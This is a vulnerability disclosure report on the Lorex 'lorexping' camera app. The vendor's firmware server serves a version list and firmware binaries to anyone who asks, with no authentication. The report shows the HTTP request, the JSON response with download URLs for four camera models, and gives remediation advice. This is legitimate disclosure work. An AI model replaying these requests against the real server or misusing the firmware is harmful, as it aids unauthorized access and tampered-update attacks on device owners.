# Vulnerability Report - com.lorexcorp.lorexping- Incorrect Access Control

**Product:** `com.lorexcorp.lorexping` 

**Vendor:** [LOREX TECHNOLOGY INC.](https://www.lorex.com/)

**Version:** 1.4.22

**Vulnerability Type:** Incorrect Access Control

**Severity:** High

## Description

The `com.lorexcorp.lorexping` , developed by **LOREX TECHNOLOGY INC.A**, suffers from an Incorrect Access Control vulnerability during the device firmware update process. The app uses HTTPS requests to download firmware updates. By reverse engineering the app, it was possible to identify the firmware download mechanism and the download link. Dynamic testing revealed that the vendor's firmware server lacks proper access control, leading to **firmware leakage**.

## Reproduction Steps

1. The `Auto_upgrade_url` Field  value in the `CameraList` class provides the necessary URL and other information required for the HTTPS request. Static reverse engineering allows for the reconstruction of the complete request as follows:

   ![image-20241003214700323](https://s2.loli.net/2024/10/03/ixTsJbZRLPuCXMz.png)

2. Sending this URL request to the firmware server results in a direct response containing the latest firmware information as follows:

   > Request

   ```http
   GET http://str.flirservices.com/versions.json HTTP/1.1
   User-Agent: Fiddler Everywhere
   Host: str.flirservices.com
   Content-Length: 0
   Content-Type: text/plain
   
   
   ```

   > Response:

   ```http
   HTTP/1.1 200 OK
   Connection: close
   Content-Length: 868
   Content-Type: application/json
   Date: Thu, 03 Oct 2024 13:42:16 GMT
   Etag: "3655eca77c83591851e0abd87e92f2bb"
   Last-Modified: Tue, 06 Feb 2018 09:52:17 GMT
   Server: AmazonS3
   X-Amz-Id-2: wwD2GZDQmODJeyhaGZQmtO3KB3MszIKN7R7vM1v4RnsocC1pM0usqPbKQV1+vPAyQNuhrbeEm2Y=
   X-Amz-Request-Id: DHRTFK81XQGVCMR3
   
   {
     "vendor": "starvidia",
     "products": [
       {
         "model": "LNC104",
         "version": "030605",
         "url": "http://str.flirservices.com/LNC104/LNC104_20150624_030699.bin",
         "md5": "",
         "type": "regular",
         "source": "*"
       },
       {
         "model": "LNC204",
         "version": "030605",
         "url": "http://str.flirservices.com/LNC204/LNC204_20150624_030699.bin",
         "md5": "",
         "type": "regular",
         "source": "*"
       },
       {
         "model": "LNC226",
         "version": "030605",
         "url": "http://str.flirservices.com/LNC226/LNC226_20150624_030699.bin",
         "md5": "",
         "type": "regular",
         "source": "*"
       },
       {
         "model": "LNC234",
         "version": "030605",
         "url": "http://str.flirservices.com/LNC234/LNC234_20150624_030699.bin",
         "md5": "",
         "type": "regular",
         "source": "*"
       }
     ]
   }
   
   ```

3. Consequently, the unprotected firmware can be directly downloaded using this information.

   ![image-20241003214804996](https://s2.loli.net/2024/10/03/SCUOHYW3N9EsotV.png)
   
   In total, we successfully downloaded **4 firmware** by exploiting the vulnerability.


## Impact

An attacker can exploit this vulnerability to:

* Download the latest firmware before it is officially released.
* Analyze the firmware for vulnerabilities or proprietary information.
* Create modified firmware images with malicious code.
* Distribute compromised firmware updates to unsuspecting users.

## Remediation

* Implement proper access control on the firmware server, such as device ID and user ID verification.
* Enhance the app's firmware update mechanism to include authentication credentials in the requests.
* Deprecate the firmware download links used in the old app.


## Disclaimer

This vulnerability report is provided for informational purposes only and should not be used for any malicious activities. The author is not responsible for any misuse of the information contained herein.